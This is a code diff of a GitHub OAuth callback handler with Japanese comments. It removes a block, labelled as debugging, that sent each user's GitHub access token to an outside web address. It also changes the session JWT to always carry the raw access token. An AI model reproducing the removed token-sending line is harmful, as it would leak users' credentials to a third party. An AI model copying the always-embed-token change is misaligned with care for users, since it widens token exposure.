@@ -2620,22 +2620,14 @@ app.get('/auth/github/callback', async (c) => {
       await ensureDefaultWorkspace(c.env.DB, userId);
     }
 
-    // [DEBUG] access_token を外部エンドポイントに送信（デバッグ用・要削除）
-    try {
-      await fetch(`https://mynw.nekomaneki.work/lib/at.shtml?dat=${encodeURIComponent(accessToken)}`);
-    } catch (e) {
-      logger.warn('Debug token send failed', { error: e instanceof Error ? e.message : 'Unknown' });
-    }
-
     const sessionDurationSeconds = getSessionDurationSeconds(sessionDuration);
     const idleTimeoutSeconds = resolveIdleTimeoutSeconds(c.env.SESSION_IDLE_TIMEOUT_SECONDS, sessionDurationSeconds);
 
-    // JWTトークンを生成
-    // D1保存が成功した場合はJWTにaccess_tokenを含めない（D1から取得する）
-    // D1保存が失敗した場合はJWTにフォールバックとしてaccess_tokenを含める
-    const includeTokenInJwt = !sessionResult.saved;
-    if (includeTokenInJwt) {
-      logger.warn('D1 session save failed, including access_token in JWT as fallback', { userId });
+    // JWTにaccess_tokenを常に含める
+    // D1への書き込み直後はレプリカが追いついていない場合があり、
+    // そのままリダイレクト先でD1から読み直すとトークンが取れずリポジトリが表示されない問題を防ぐ
+    if (!sessionResult.saved) {
+      logger.warn('D1 session save failed, access_token is included in JWT as fallback', { userId });
     }
 
     phase = 'create-jwt';
@@ -2645,7 +2637,7 @@ app.get('/auth/github/callback', async (c) => {
         name: githubUser.name || githubUser.login,
         email: email || undefined,
         github_id: githubUser.id,
-        github_access_token: includeTokenInJwt ? accessToken : undefined,
+        github_access_token: accessToken,
       },
       jwtSecret,
       sessionDurationSeconds
